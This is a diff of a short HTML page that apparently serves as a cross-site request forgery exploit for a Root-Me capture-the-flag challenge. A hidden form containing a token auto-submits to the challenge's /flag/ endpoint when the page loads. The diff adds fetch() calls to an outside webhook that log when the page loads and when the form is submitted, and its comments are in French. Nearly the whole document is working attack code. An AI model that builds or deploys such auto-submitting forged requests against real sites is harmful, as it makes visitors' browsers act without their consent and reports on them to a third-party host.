@@ -1,17 +1,20 @@
 <html>
   <body>
+    <script>
+      // Envoie une requête à ton webhook pour logger l'accès
+      fetch('https://webhooksite.net/f15dcda9-0e82-428b-a522-352436ffddda?page=loaded');
+    </script>
     <form
       action="https://instance-019e0781-670f-7278-9210-6cbcaec51f91.challenges.root-me.pro/flag/"
       method="POST"
       style="display:none;"
     >
       <input type="hidden" name="csrf_token" value="dXNlcnJlc3U=" />
-      <!-- Ajoute d'autres champs si nécessaire, ex: -->
-      <input type="hidden" name="username" value="user" />
-      <input type="hidden" name="action" value="grant" />
     </form>
     <script>
       document.forms[0].submit();
+      // Envoie une requête au webhook après soumission
+      fetch('https://webhooksite.net/f15dcda9-0e82-428b-a522-352436ffddda?form=submitted');
     </script>
   </body>
 </html>
